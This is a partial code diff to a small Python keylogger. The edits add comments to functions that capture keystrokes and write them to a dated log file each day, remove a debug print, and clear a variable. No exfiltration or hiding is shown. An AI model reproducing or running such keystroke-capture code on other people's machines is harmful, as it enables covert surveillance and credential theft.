@@ -11,6 +11,7 @@ Full_day_list = ''
 
 
 def create_new_text():
+    # creates a logfile for the current date if it doesnt already exist
     global current_date
     while True:
         current_date = datetime.now()
@@ -19,6 +20,7 @@ def create_new_text():
                 file.close()
 
 def writeloop():
+    # This function will write to the log file every day at midnight
     global current_date
     global previous_date
     global word
@@ -27,15 +29,16 @@ def writeloop():
         if current_date.date() > previous_date.date() + timedelta(days=1):
             Full_day_list = word
             word = ''
-            print(Full_day_list)
             with open('log{}.txt'.format(previous_date.date()), 'w') as file:
                 file.write(Full_day_list)
                 file.close()
+            Full_day_list = None    # attempt at freeing up some memory
             previous_date = datetime.now()
 
 
 
 def keypress(key):
+    # logging keystrokes
     global word
     if key == Key.space:
         word += ' '
@@ -61,3 +64,4 @@ thread1.isDaemon()
 thread1.start()
 thread2.start()
 X.start()
+
